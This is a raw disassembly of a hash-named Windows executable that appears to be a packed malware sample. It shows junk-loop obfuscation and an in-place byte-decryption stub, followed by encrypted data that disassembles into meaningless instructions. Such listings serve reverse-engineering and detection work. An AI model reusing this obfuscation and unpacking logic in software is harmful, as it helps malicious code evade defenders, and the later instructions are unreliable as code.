
6759ee10c3eccda2c7c3ea17e53076809ff26a2a5be73952f8a99b2ea795dfb0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    DWORD PTR ds:0x42b1de,0x13
  401013:	cmp    DWORD PTR ds:0x42b1de,0x0
  40101a:	je     0x401078
  401020:	cmp    DWORD PTR ds:0x42b1de,0x7
  401027:	jb     0x401078
  40102d:	jmp    0x401050
  401032:	push   0x42a019
  401037:	push   0x564d
  40103c:	push   DWORD PTR [ebp-0x28]
  40103f:	push   0x8804
  401044:	push   DWORD PTR [ebp-0x24]
  401047:	push   DWORD PTR [ebp-0x18]
  40104a:	call   DWORD PTR ds:0x42b2ea
  401050:	cmp    DWORD PTR ds:0x42b1de,0x8
  401057:	jne    0x401068
  40105d:	mov    eax,ds:0x42b1de
  401062:	dec    eax
  401063:	mov    ds:0x42b1de,eax
  401068:	mov    eax,ds:0x42b1de
  40106d:	dec    eax
  40106e:	mov    ds:0x42b1de,eax
  401073:	jmp    0x401013
  401078:	mov    eax,DWORD PTR [ebp+0x8]
  40107b:	mov    ecx,DWORD PTR ds:0x42b1be
  401081:	add    DWORD PTR ds:0x42b22a,ecx
  401087:	push   ebx
  401088:	and    DWORD PTR ds:0x42b21e,0x0
  401092:	xor    ecx,ecx
  401094:	or     ecx,DWORD PTR ds:0x42b21e
  40109a:	inc    ecx
  40109b:	mov    DWORD PTR ds:0x42b21e,ecx
  4010a1:	cmp    DWORD PTR ds:0x42b21e,0xc
  4010a8:	ja     0x4010ef
  4010ae:	jmp    0x4010c8
  4010b3:	push   0x42a03d
  4010b8:	push   0x0
  4010ba:	push   DWORD PTR [ebp-0xc]
  4010bd:	push   0x87c3
  4010c2:	call   DWORD PTR ds:0x42b2ee
  4010c8:	cmp    DWORD PTR ds:0x42b21e,0xb
  4010cf:	jne    0x4010e2
  4010d5:	mov    ecx,DWORD PTR ds:0x42b21e
  4010db:	inc    ecx
  4010dc:	mov    DWORD PTR ds:0x42b21e,ecx
  4010e2:	cmp    DWORD PTR ds:0x42b21e,0x1b
  4010e9:	jb     0x401092
  4010ef:	push   esi
  4010f0:	push   edi
  4010f1:	mov    esi,0x75108ae
  4010f6:	mov    DWORD PTR ds:0x42b1f6,0x15
  401100:	cmp    DWORD PTR ds:0x42b1f6,0x0
  401107:	je     0x401156
  40110d:	cmp    DWORD PTR ds:0x42b1f6,0x9
  401114:	jb     0x401156
  40111a:	jmp    0x40112a
  40111f:	push   0x7250
  401124:	call   DWORD PTR ds:0x42b2f2
  40112a:	cmp    DWORD PTR ds:0x42b1f6,0xa
  401131:	jne    0x401144
  401137:	mov    ecx,DWORD PTR ds:0x42b1f6
  40113d:	dec    ecx
  40113e:	mov    DWORD PTR ds:0x42b1f6,ecx
  401144:	mov    ecx,DWORD PTR ds:0x42b1f6
  40114a:	dec    ecx
  40114b:	mov    DWORD PTR ds:0x42b1f6,ecx
  401151:	jmp    0x401100
  401156:	xor    eax,esi
  401158:	mov    edi,0x3272f5
  40115d:	dec    DWORD PTR ds:0x42b19e
  401163:	add    eax,edi
  401165:	add    DWORD PTR ds:0x42b186,edi
  40116b:	mov    DWORD PTR [ebp-0x40],eax
  40116e:	mov    eax,ds:0x42a2f2
  401173:	xor    DWORD PTR ds:0x42b1aa,0x2d22
  40117d:	mov    eax,DWORD PTR [eax]
  40117f:	mov    ecx,DWORD PTR ds:0x42b22e
  401185:	sbb    ecx,DWORD PTR ds:0x42b1fe
  40118b:	mov    DWORD PTR ds:0x42b22e,ecx
  401191:	mov    DWORD PTR [ebp-0x3c],eax
  401194:	and    DWORD PTR ds:0x42b192,0x0
  40119e:	jmp    0x4011b0
  4011a3:	mov    ecx,DWORD PTR ds:0x42b192
  4011a9:	inc    ecx
  4011aa:	mov    DWORD PTR ds:0x42b192,ecx
  4011b0:	cmp    DWORD PTR ds:0x42b192,0x15
  4011b7:	jae    0x4011f9
  4011bd:	cmp    DWORD PTR ds:0x42b192,0x8
  4011c4:	jg     0x4011f9
  4011ca:	jmp    0x4011da
  4011cf:	push   0x42b1aa
  4011d4:	call   DWORD PTR ds:0x42b2f6
  4011da:	cmp    DWORD PTR ds:0x42b192,0x7
  4011e1:	jne    0x4011f4
  4011e7:	mov    ecx,DWORD PTR ds:0x42b192
  4011ed:	inc    ecx
  4011ee:	mov    DWORD PTR ds:0x42b192,ecx
  4011f4:	jmp    0x4011a3
  4011f9:	mov    eax,ds:0x42a502
  4011fe:	xor    DWORD PTR ds:0x42b182,0x12c5
  401208:	mov    eax,DWORD PTR [eax]
  40120a:	mov    DWORD PTR [ebp-0x1c],eax
  40120d:	mov    DWORD PTR ds:0x42b1da,0x1a
  401217:	cmp    DWORD PTR ds:0x42b1da,0x0
  40121e:	je     0x40127b
  401224:	cmp    DWORD PTR ds:0x42b1da,0x8
  40122b:	jl     0x40127b
  401231:	jmp    0x401250
  401236:	push   0x42b1ba
  40123b:	push   0x42b1d2
  401240:	push   0x8af3
  401245:	push   0x42a12c
  40124a:	call   DWORD PTR ds:0x42b2fa
  401250:	cmp    DWORD PTR ds:0x42b1da,0x9
  401257:	jne    0x40126b
  40125d:	xor    eax,eax
  40125f:	or     eax,DWORD PTR ds:0x42b1da
  401265:	dec    eax
  401266:	mov    ds:0x42b1da,eax
  40126b:	mov    eax,ds:0x42b1da
  401270:	dec    eax
  401271:	mov    ds:0x42b1da,eax
  401276:	jmp    0x401217
  40127b:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401282:	mov    eax,DWORD PTR [ebp-0x34]
  401285:	xor    eax,esi
  401287:	xor    DWORD PTR ds:0x42b222,edi
  40128d:	add    eax,edi
  40128f:	or     ecx,DWORD PTR ds:0x42b222
  401295:	mov    DWORD PTR [ebp-0x40],eax
  401298:	adc    ecx,DWORD PTR ds:0x42b19a
  40129e:	mov    eax,ds:0x42a472
  4012a3:	xor    DWORD PTR ds:0x42b1d6,0x6afc
  4012ad:	mov    DWORD PTR [ebp-0x40],eax
  4012b0:	mov    eax,DWORD PTR [ebp-0x3c]
  4012b3:	mov    DWORD PTR [ebp-0x14],eax
  4012b6:	adc    eax,0x46d9
  4012bb:	mov    eax,DWORD PTR [ebp-0x14]
  4012be:	and    DWORD PTR ds:0x42b222,0x0
  4012c8:	jmp    0x4012da
  4012cd:	mov    ecx,DWORD PTR ds:0x42b222
  4012d3:	inc    ecx
  4012d4:	mov    DWORD PTR ds:0x42b222,ecx
  4012da:	cmp    DWORD PTR ds:0x42b222,0x1c
  4012e1:	jae    0x401328
  4012e7:	cmp    DWORD PTR ds:0x42b222,0x5
  4012ee:	jg     0x401328
  4012f4:	jmp    0x401309
  4012f9:	push   0x42b1e2
  4012fe:	push   0x42a2a1
  401303:	call   DWORD PTR ds:0x42b2fe
  401309:	cmp    DWORD PTR ds:0x42b222,0x4
  401310:	jne    0x401323
  401316:	mov    ecx,DWORD PTR ds:0x42b222
  40131c:	inc    ecx
  40131d:	mov    DWORD PTR ds:0x42b222,ecx
  401323:	jmp    0x4012cd
  401328:	push   0x4
  40132a:	or     DWORD PTR ds:0x42b186,0x3485
  401334:	pop    ecx
  401335:	and    DWORD PTR ds:0x42b206,0x42b1ee
  40133f:	sub    ecx,eax
  401341:	dec    eax
  401342:	add    ecx,DWORD PTR [ebp-0x1c]
  401345:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  40134c:	adc    DWORD PTR ds:0x42b20e,0x42b1e2
  401356:	mov    DWORD PTR [ebp-0x18],ecx
  401359:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  401363:	or     DWORD PTR ds:0x42b182,0x6f89
  40136d:	mov    eax,DWORD PTR [ebp-0x14]
  401370:	xor    DWORD PTR ds:0x42b20e,0x6cd3
  40137a:	mov    DWORD PTR [ebp-0x9c],eax
  401380:	adc    eax,DWORD PTR ds:0x42b196
  401386:	mov    eax,DWORD PTR [ebp-0x18]
  401389:	and    DWORD PTR ds:0x42b22a,0x42b226
  401393:	mov    DWORD PTR [ebp-0x98],eax
  401399:	xor    DWORD PTR ds:0x42b186,ecx
  40139f:	mov    eax,DWORD PTR [ebp-0x2c]
  4013a2:	adc    DWORD PTR ds:0x42b1f6,0x42b22a
  4013ac:	xor    eax,esi
  4013ae:	add    eax,edi
  4013b0:	add    DWORD PTR ds:0x42b22e,0x47bc
  4013ba:	mov    DWORD PTR [ebp-0x94],eax
  4013c0:	and    DWORD PTR ds:0x42b20e,0x42b202
  4013ca:	lea    eax,[ebp-0x48]
  4013cd:	mov    DWORD PTR [ebp-0x90],eax
  4013d3:	add    eax,0x2eac
  4013d8:	mov    eax,DWORD PTR [ebp-0xa0]
  4013de:	xor    eax,esi
  4013e0:	sub    DWORD PTR ds:0x42b20e,0x42b1f6
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0xa0],eax
  4013f2:	inc    DWORD PTR ds:0x42b1ce
  4013f8:	lea    eax,[ebp-0xa0]
  4013fe:	add    DWORD PTR ds:0x42b1a6,0x42b21a
  401408:	push   eax
  401409:	sub    DWORD PTR ds:0x42b1fe,ebx
  40140f:	mov    eax,DWORD PTR [ebp+0xc]
  401412:	and    DWORD PTR ds:0x42b226,0xfdc
  40141c:	xor    eax,esi
  40141e:	add    eax,edi
  401420:	push   eax
  401421:	and    DWORD PTR ds:0x42b192,ecx
  401427:	mov    eax,ds:0x42a492
  40142c:	sub    DWORD PTR ds:0x42b1f6,0x42b1c6
  401436:	push   0x42a3e8
  40143b:	and    DWORD PTR ds:0x42b1c2,0x42b19e
  401445:	push   DWORD PTR [eax]
  401447:	call   0x4061fa
  40144c:	mov    ebx,DWORD PTR ds:0x42b226
  401452:	add    ebx,DWORD PTR ds:0x42b19a
  401458:	mov    DWORD PTR ds:0x42b226,ebx
  40145e:	mov    ebx,DWORD PTR [ebp-0x14]
  401461:	adc    edx,DWORD PTR ds:0x42b1da
  401467:	mov    eax,DWORD PTR [ebp-0x18]
  40146a:	and    DWORD PTR ds:0x42b1f2,0x0
  401474:	mov    edx,DWORD PTR ds:0x42b1f2
  40147a:	inc    edx
  40147b:	mov    DWORD PTR ds:0x42b1f2,edx
  401481:	cmp    DWORD PTR ds:0x42b1f2,0x8
  401488:	ja     0x4014d0
  40148e:	jmp    0x4014a9
  401493:	push   DWORD PTR [ebp-0x10]
  401496:	push   DWORD PTR [ebp-0x28]
  401499:	push   0x42a223
  40149e:	push   0x400000
  4014a3:	call   DWORD PTR ds:0x42b306
  4014a9:	cmp    DWORD PTR ds:0x42b1f2,0x7
  4014b0:	jne    0x4014c3
  4014b6:	mov    edx,DWORD PTR ds:0x42b1f2
  4014bc:	inc    edx
  4014bd:	mov    DWORD PTR ds:0x42b1f2,edx
  4014c3:	cmp    DWORD PTR ds:0x42b1f2,0x1e
  4014ca:	jb     0x401474
  4014d0:	mov    DWORD PTR [ebp-0x58],eax
  4014d3:	or     DWORD PTR ds:0x42b1ce,edi
  4014d9:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  4014e0:	sub    DWORD PTR ds:0x42b1f2,0x209f
  4014ea:	mov    eax,0xf89c85a3
  4014ef:	sbb    DWORD PTR ds:0x42b21a,0x6d23
  4014f9:	mov    DWORD PTR [ebp-0x1c],eax
  4014fc:	sub    DWORD PTR ds:0x42b206,ebx
  401502:	lea    ecx,[eax+0x2]
  401505:	adc    edx,0x42c6
  40150b:	mov    DWORD PTR [ebp-0x28],ecx
  40150e:	inc    edx
  40150f:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  401516:	or     edx,DWORD PTR ds:0x42b182
  40151c:	mov    DWORD PTR [ebp-0x8],eax
  40151f:	mov    edx,DWORD PTR ds:0x42b256
  401525:	xor    eax,eax
  401527:	xor    eax,DWORD PTR ds:0x42b276
  40152d:	sub    edx,eax
  40152f:	sub    edx,DWORD PTR [edx+eax*1]
  401532:	mov    eax,DWORD PTR [ebp-0x10]
  401535:	xor    DWORD PTR ds:0x42b1b2,edi
  40153b:	xor    eax,esi
  40153d:	sub    DWORD PTR ds:0x42b1be,ecx
  401543:	mov    edx,0xffcd8d8b
  401548:	sbb    DWORD PTR ds:0x42b182,0x343
  401552:	sub    edx,eax
  401554:	mov    DWORD PTR [ebp-0xc],edx
  401557:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  40155e:	mov    eax,DWORD PTR [ebp-0x8]
  401561:	mov    DWORD PTR ds:0x42b216,0x6ef4
  40156b:	mov    DWORD PTR [ebp-0x3c],ebx
  40156e:	mov    DWORD PTR ds:0x42b206,0x4694
  401578:	cmp    eax,ecx
  40157a:	mov    DWORD PTR ds:0x42b21e,0x4f34
  401584:	je     0x401870
  40158a:	or     eax,DWORD PTR ds:0x42b22e
  401590:	mov    eax,DWORD PTR [ebp-0x10]
  401593:	and    DWORD PTR ds:0x42b21a,0x0
  40159d:	jmp    0x4015af
  4015a2:	mov    ecx,DWORD PTR ds:0x42b21a
  4015a8:	inc    ecx
  4015a9:	mov    DWORD PTR ds:0x42b21a,ecx
  4015af:	cmp    DWORD PTR ds:0x42b21a,0x1b
  4015b6:	jae    0x4015e4
  4015bc:	cmp    DWORD PTR ds:0x42b21a,0x1c
  4015c3:	jb     0x4015e4
  4015c9:	jmp    0x4015df
  4015ce:	push   0x42a211
  4015d3:	push   DWORD PTR [ebp-0x1c]
  4015d6:	push   DWORD PTR [ebp-0x14]
  4015d9:	call   DWORD PTR ds:0x42b30e
  4015df:	jmp    0x4015a2
  4015e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4015e7:	adc    DWORD PTR ds:0x42b196,0x5f31
  4015f1:	xor    eax,esi
  4015f3:	xor    ecx,esi
  4015f5:	or     DWORD PTR ds:0x42b1d6,0x22e1
  4015ff:	lea    ecx,[eax+ecx*1+0x64e5ea]
  401606:	mov    eax,ds:0x42b186
  40160b:	xor    DWORD PTR ds:0x42b1ee,eax
  401611:	mov    eax,DWORD PTR [ebp-0xc]
  401614:	xor    edx,edx
  401616:	xor    DWORD PTR ds:0x42b212,0x42b202
  401620:	div    ecx
  401622:	mov    eax,DWORD PTR [ebp-0x8]
  401625:	sub    DWORD PTR ds:0x42b192,edi
  40162b:	mov    ecx,DWORD PTR [ebp-0x10]
  40162e:	xor    eax,esi
  401630:	add    DWORD PTR ds:0x42b1c6,0x2cb7
  40163a:	xor    ecx,esi
  40163c:	sub    eax,ecx
  40163e:	mov    DWORD PTR ds:0x42b21a,0x2b73
  401648:	cmp    edx,eax
  40164a:	mov    DWORD PTR ds:0x42b21e,0x4704
  401654:	jne    0x40181a
  40165a:	mov    eax,DWORD PTR [ebp-0xc]
  40165d:	xor    ecx,0x1cf0
  401663:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  40166a:	mov    eax,DWORD PTR [ebp-0x28]
  40166d:	add    DWORD PTR ds:0x42b1ce,0x4d15
  401677:	mov    ecx,DWORD PTR [ebp-0x18]
  40167a:	or     DWORD PTR ds:0x42b18e,0x42b1ea
  401684:	xor    eax,esi
  401686:	add    DWORD PTR ds:0x42b18e,0x42b182
  401690:	xor    ecx,esi
  401692:	or     DWORD PTR ds:0x42b21a,0x42b1aa
  40169c:	add    eax,edi
  40169e:	adc    DWORD PTR ds:0x42b1e2,0x3afa
  4016a8:	add    ecx,edi
  4016aa:	mov    BYTE PTR [ebp-0x21],dl
  4016ad:	cmp    eax,ecx
  4016af:	jae    0x4017e8
  4016b5:	and    DWORD PTR ds:0x42b1fe,0x0
  4016bf:	mov    edx,DWORD PTR ds:0x42b1fe
  4016c5:	inc    edx
  4016c6:	mov    DWORD PTR ds:0x42b1fe,edx
  4016cc:	cmp    DWORD PTR ds:0x42b1fe,0x27
  4016d3:	ja     0x4016f6
  4016d9:	jmp    0x4016e9
  4016de:	push   0x18bf
  4016e3:	call   DWORD PTR ds:0x42b316
  4016e9:	cmp    DWORD PTR ds:0x42b1fe,0x18
  4016f0:	jb     0x4016bf
  4016f6:	lea    ecx,[eax-0x3272f5]
  4016fc:	adc    DWORD PTR ds:0x42b19e,0x3c59
  401706:	mov    DWORD PTR [ebp-0x14],ecx
  401709:	mov    edx,DWORD PTR [ebp-0x14]
  40170c:	xor    edx,esi
  40170e:	add    DWORD PTR ds:0x42b192,0x42b1fa
  401718:	add    edx,0x7f55d8e3
  40171e:	lea    ecx,[ebp+eax*4-0xb4]
  401725:	mov    DWORD PTR ds:0x42b1ca,0x6fb0
  40172f:	mov    DWORD PTR [ecx],edx
  401731:	mov    edx,DWORD PTR [ecx]
  401733:	cmp    edx,0x244ecb80
  401739:	mov    DWORD PTR ds:0x42b1e2,0xbe5
  401743:	jbe    0x40175e
  401749:	add    DWORD PTR [ecx],0x405fcc1
  40174f:	mov    DWORD PTR ds:0x42b1ca,0x62ff
  401759:	jmp    0x401764
  40175e:	add    DWORD PTR [ecx],0xfdaf433f
  401764:	sbb    DWORD PTR ds:0x42b1c2,0x1be5
  40176e:	mov    ecx,DWORD PTR [ebp-0x18]
  401771:	xor    DWORD PTR ds:0x42b1c6,0x42b18e
  40177b:	xor    ecx,esi
  40177d:	xor    DWORD PTR ds:0x42b1f6,0x42b192
  401787:	inc    eax
  401788:	inc    DWORD PTR [ebp-0x14]
  40178b:	adc    DWORD PTR ds:0x42b1b2,0x7e0f
  401795:	add    ecx,edi
  401797:	cmp    eax,ecx
  401799:	jb     0x401709
  40179f:	mov    DWORD PTR ds:0x42b192,0x13
  4017a9:	cmp    DWORD PTR ds:0x42b192,0x0
  4017b0:	je     0x4017e5
  4017b6:	cmp    DWORD PTR ds:0x42b192,0x20
  4017bd:	jl     0x4017e5
  4017c3:	jmp    0x4017d5
  4017c8:	push   0xd
  4017ca:	push   0x57ae
  4017cf:	call   DWORD PTR ds:0x42b31a
  4017d5:	mov    eax,ds:0x42b192
  4017da:	dec    eax
  4017db:	mov    ds:0x42b192,eax
  4017e0:	jmp    0x4017a9
  4017e5:	mov    dl,BYTE PTR [ebp-0x21]
  4017e8:	mov    eax,ds:0x42b226
  4017ed:	sub    eax,DWORD PTR ds:0x42b1ce
  4017f3:	mov    ds:0x42b226,eax
  4017f8:	mov    eax,DWORD PTR [ebp-0x34]
  4017fb:	xor    al,0xae
  4017fd:	mov    cl,0xb
  4017ff:	sub    cl,al
  401801:	add    dl,cl
  401803:	mov    ecx,DWORD PTR [ebp-0x1c]
  401806:	xor    cl,0xae
  401809:	sub    cl,0xb
  40180c:	ror    dl,cl
  40180e:	xor    eax,eax
  401810:	mov    eax,DWORD PTR [ebp-0xc]
  401813:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  40181a:	mov    eax,DWORD PTR [ebp-0xc]
  40181d:	mov    ecx,DWORD PTR [ebp-0x28]
  401820:	sub    eax,edi
  401822:	xor    eax,esi
  401824:	cmp    eax,ecx
  401826:	jne    0x401850
  40182c:	mov    eax,DWORD PTR [ebp-0x8]
  40182f:	mov    ecx,DWORD PTR [ebp-0x10]
  401832:	xor    eax,esi
  401834:	xor    ecx,esi
  401836:	sub    eax,ecx
  401838:	sub    eax,edi
  40183a:	xor    eax,esi
  40183c:	mov    DWORD PTR [ebp-0x8],eax
  40183f:	mov    eax,DWORD PTR [ebp-0x10]
  401842:	xor    eax,esi
  401844:	mov    ecx,0xffcd8d8b
  401849:	sub    ecx,eax
  40184b:	jmp    0x40185f
  401850:	mov    eax,DWORD PTR [ebp-0x10]
  401853:	xor    eax,esi
  401855:	mov    ecx,0xffcd8d0b
  40185a:	sub    ecx,eax
  40185c:	add    ecx,DWORD PTR [ebp-0xc]
  40185f:	mov    DWORD PTR [ebp-0xc],ecx
  401862:	mov    eax,DWORD PTR [ebp-0x8]
  401865:	cmp    eax,0xf89c85a5
  40186a:	jne    0x40158a
  401870:	mov    DWORD PTR [ebp-0x34],0x9
  401877:	mov    ecx,DWORD PTR [ebp+0x8]
  40187a:	xor    ecx,esi
  40187c:	add    ecx,edi
  40187e:	jmp    0x406188
  401883:	lea    eax,[ecx+ebx*1]
  401886:	mov    DWORD PTR [ebp-0x2c],eax
  401889:	mov    eax,DWORD PTR [ebp-0x58]
  40188c:	sub    eax,ecx
  40188e:	mov    DWORD PTR [ebp-0x1c],eax
  401891:	mov    eax,DWORD PTR [ebp-0x1c]
  401894:	mov    DWORD PTR [ebp-0x14],eax
  401897:	mov    eax,DWORD PTR [ebp-0x2c]
  40189a:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  4018a1:	mov    DWORD PTR [ebp-0x54],eax
  4018a4:	mov    DWORD PTR [ebp-0x20],0xf89c85a2
  4018ab:	mov    eax,DWORD PTR [ebp-0x38]
  4018ae:	xor    eax,esi
  4018b0:	add    eax,edi
  4018b2:	mov    DWORD PTR [ebp-0x10],eax
  4018b5:	mov    eax,DWORD PTR [ebp-0x38]
  4018b8:	xor    eax,esi
  4018ba:	add    eax,edi
  4018bc:	mov    DWORD PTR [ebp-0x8],eax
  4018bf:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4018c6:	jmp    0x403c1b
  4018cb:	mov    al,0x2a
  4018cd:	dec    ecx
  4018ce:	and    ebp,eax
  4018d0:	adc    ch,BYTE PTR [eax-0x7dd88776]
  4018d6:	push   esi
  4018d7:	push   cs
  4018d8:	jb     0x4018f2
  4018da:	add    BYTE PTR [ebx+0x4b838383],al
  4018e0:	pop    esi
  4018e1:	add    DWORD PTR [ebx+0x3c263128],0x24
  4018e8:	cmp    BYTE PTR [edx],ah
  4018ea:	cs js  0x401928
  4018ed:	je     0x401966
  4018ef:	in     al,dx
  4018f0:	jno    0x401962
  4018f2:	jae    0x401964
  4018f4:	dec    ebx
  4018f5:	fsub   st,st(1)
  4018f7:	cld    
  4018f8:	ins    DWORD PTR es:[edi],dx
  4018f9:	push   ebp
  4018fa:	jb     0x401978
  4018fc:	bound  ebp,QWORD PTR [ebp-0x319b8f83]
  401902:	pusha  
  401903:	push   ebx
  401904:	cmp    eax,0x87960391
  401909:	push   ax
  40190b:	jle    0x401953
  40190d:	lea    esi,[edi+0x42bbbd7e]
  401913:	xor    esi,edi
  401915:	ja     0x4018f8
  401917:	add    ebp,DWORD PTR [edx+0x7e]
  40191a:	pop    ds
  40191b:	lock inc esp
  40191d:	rol    bl,1
  40191f:	lock xchg esi,eax
  401921:	sub    bl,bh
  401923:	xchg   edx,eax
  401924:	xor    al,0xe
  401926:	fs mov dl,0x93
  401929:	fld    DWORD PTR [esi]
  40192b:	jo     0x40190d
  40192d:	sbb    ecx,ebp
  40192f:	lsl    esi,WORD PTR [edi]
  401932:	and    eax,0x72371155
  401937:	jne    0x4018fd
  401939:	scas   al,BYTE PTR es:[edi]
  40193a:	sub    bl,BYTE PTR [eax+ebx*1-0x49]
  40193e:	(bad)  
  40193f:	hlt    
  401940:	push   esp
  401941:	xor    cl,BYTE PTR [ecx+0x462d54b]
  401947:	and    eax,DWORD PTR [ebx]
  401949:	test   DWORD PTR [edx+edi*2-0x6da15a20],edi
  401950:	mov    esp,0x4c9b2916
  401955:	or     bl,BYTE PTR [edi+0x128a8b41]
  40195b:	jecxz  0x40198d
  40195d:	imul   edx,DWORD PTR [eax-0x596b5b7],0xffffffce
  401964:	xchg   ebx,eax
  401965:	xor    al,0x94
  401967:	int    0xc6
  401969:	rcl    DWORD PTR [ebp+0x6b58f96c],1
  40196f:	push   ecx
  401970:	adc    DWORD PTR [edi],edi
  401972:	or     al,BYTE PTR [edi+0x1a]
  401975:	mov    al,0x52
  401977:	shl    DWORD PTR [esi+0x6719dd4d],cl
  40197d:	add    BYTE PTR [ebx+0x67],ch
  401980:	mov    eax,0x5be7504
  401985:	pop    ebx
  401986:	sbb    eax,0x33df7f17
  40198b:	int3   
  40198c:	dec    edi
  40198d:	push   es
  40198e:	mov    edx,0x5e5eafc4
  401993:	and    dl,cl
  401995:	dec    esi
  401996:	fwait
  401997:	sbb    edx,DWORD PTR [eax+0x43]
  40199a:	rcr    DWORD PTR [ebx],0x99
  40199d:	out    0xc3,al
  40199f:	call   0xea961c80
  4019a4:	outs   dx,DWORD PTR ds:[esi]
  4019a5:	lods   al,BYTE PTR ds:[esi]
  4019a6:	push   edi
  4019a7:	push   ebp
  4019a8:	fwait
  4019a9:	pop    ebp
  4019aa:	sub    al,0x8c
  4019ac:	icebp  
  4019ad:	jno    0x401a20
  4019af:	rcr    dl,0x87
  4019b2:	mov    BYTE PTR [ebp+0x45],0x1f
  4019b6:	sub    al,0x51
  4019b8:	stos   BYTE PTR es:[edi],al
  4019b9:	dec    ecx
  4019ba:	sub    dl,dl
  4019bc:	addr16 sub edi,edi
  4019bf:	mov    eax,0x87260aa3
  4019c4:	loopne 0x401979
  4019c6:	jg     0x40197b
  4019c8:	push   ecx
  4019c9:	sbb    eax,0x13dcb227
  4019ce:	loope  0x40197f
  4019d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019d1:	jno    0x4019b5
  4019d3:	mov    ds:0x5827128c,al
  4019d8:	push   esi
  4019d9:	aaa    
  4019da:	and    ah,BYTE PTR [ebx-0x3b]
  4019dd:	adc    bh,BYTE PTR [esp+ecx*4+0x509b0ac8]
  4019e4:	sbb    DWORD PTR [esi],ecx
  4019e6:	sbb    eax,0x3105dce8
  4019eb:	nop
  4019ec:	fs (bad) 
  4019ee:	pop    ds
  4019ef:	imul   edx,edx,0xffffffe6
  4019f2:	mov    ch,0x1
  4019f4:	les    edi,FWORD PTR [ebx+0x2d363c5a]
  4019fa:	rol    DWORD PTR [ebx+0x5b354a03],0x80
  401a01:	in     al,dx
  401a02:	leave  
  401a03:	(bad)  
  401a05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a06:	push   edx
  401a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a08:	lock sub DWORD PTR [edi-0x7a75f82d],esp
  401a0f:	and    al,0xa0
  401a11:	push   edx
  401a12:	cmp    edx,esp
  401a14:	dec    edx
  401a15:	xlat   BYTE PTR ds:[ebx]
  401a16:	jno    0x401a12
  401a18:	cmp    al,0xb4
  401a1a:	mov    cl,0x13
  401a1c:	ins    BYTE PTR es:[edi],dx
  401a1d:	adc    DWORD PTR [edx],edx
  401a1f:	fisub  WORD PTR [edx-0x72]
  401a22:	mov    edx,0xff879a4d
  401a27:	jge    0x401a74
  401a29:	out    dx,eax
  401a2a:	(bad)  
  401a2b:	leave  
  401a2c:	mov    esp,0x122f0882
  401a31:	ds nop
  401a33:	push   cs
  401a34:	xchg   ebp,eax
  401a35:	and    DWORD PTR [edi-0x3fe40749],edi
  401a3b:	mov    eax,0x6c4c9a84
  401a40:	mov    ebp,0x47d352c6
  401a45:	add    BYTE PTR [ebx*8+0x66593f90],dl
  401a4c:	mov    esp,0xf681be26
  401a51:	fdivr  DWORD PTR [edx+0x27]
  401a54:	lds    eax,FWORD PTR ds:[edx+0xa5350f1]
  401a5b:	mov    ecx,gs
  401a5d:	cmp    ecx,esi
  401a5f:	stos   DWORD PTR es:[edi],eax
  401a60:	mov    esp,0xd65c63fa
  401a65:	xor    BYTE PTR [edx+0x5d6046aa],ah
  401a6b:	aam    0xfc
  401a6d:	pop    edi
  401a6e:	lea    ebx,[ecx-0x6e]
  401a71:	mov    dh,0x82
  401a73:	mov    ebp,edx
  401a75:	popa   
  401a76:	pop    esp
  401a77:	js     0x401ac0
  401a79:	std    
  401a7a:	idiv   BYTE PTR [ecx+0xc]
  401a7d:	lods   al,BYTE PTR ds:[esi]
  401a7e:	(bad)  
  401a7f:	cmp    al,0x4d
  401a81:	xlat   BYTE PTR ds:[ebx]
  401a82:	jecxz  0x401a1b
  401a84:	xor    al,0x3b
  401a86:	sbb    al,0x9d
  401a88:	xchg   esp,eax
  401a89:	dec    DWORD PTR [edx+0x5c]
  401a8c:	fcom   DWORD PTR [ebx]
  401a8e:	daa    
  401a8f:	mov    al,0xf5
  401a91:	imul   esi,ebp,0x92728e95
  401a97:	push   esi
  401a98:	jge    0x401abb
  401a9a:	push   es
  401a9b:	push   esi
  401a9c:	xor    al,0xa7
  401a9e:	mov    ecx,0x38b02a0a
  401aa3:	loopne 0x401b1c
  401aa5:	push   0x3908764
  401aaa:	jecxz  0x401b16
  401aac:	mov    al,0x57
  401aae:	and    ebx,0x79f4759f
  401ab4:	call   0xb464a4b6
  401ab9:	imul   edx,DWORD PTR [eax-0x68],0xffffffd4
  401abd:	jmp    0x401a9f
  401abf:	js     0x401ac4
  401ac1:	(bad)  
  401ac2:	jo     0x401b09
  401ac4:	mov    ss,WORD PTR [eax-0x25ef85b4]
  401aca:	sub    al,0x78
  401acc:	hlt    
  401acd:	sbb    ebx,edx
  401acf:	mov    ebx,0xd05adf4f
  401ad4:	mov    esp,0x80894773
  401ad9:	sbb    BYTE PTR [edi-0x27d4bc30],dl
  401adf:	ret    
  401ae0:	scas   al,BYTE PTR es:[edi]
  401ae1:	popf   
  401ae2:	jecxz  0x401b60
  401ae4:	cdq    
  401ae5:	out    0xcc,al
  401ae7:	jbe    0x401b1a
  401ae9:	push   0x62
  401aeb:	and    edi,edi
  401aed:	mov    edi,DWORD PTR [esi-0x7a]
  401af0:	sbb    al,0xc8
  401af2:	inc    ecx
  401af3:	or     esp,DWORD PTR [ebx-0x4]
  401af6:	in     eax,dx
  401af7:	jae    0x401aab
  401af9:	mov    ah,0x85
  401afb:	cmp    al,0x3
  401afd:	and    ebx,DWORD PTR [eax+0x2f7e1962]
  401b03:	shl    edi,0xaa
  401b06:	ret    
  401b07:	adc    al,0x14
  401b09:	cmc    
  401b0a:	pop    es
  401b0b:	(bad)  [edx+0x41]
  401b0e:	retf   
  401b0f:	shl    BYTE PTR [ecx-0x54bda2cf],cl
  401b15:	pop    es
  401b16:	call   0x1d3b041f
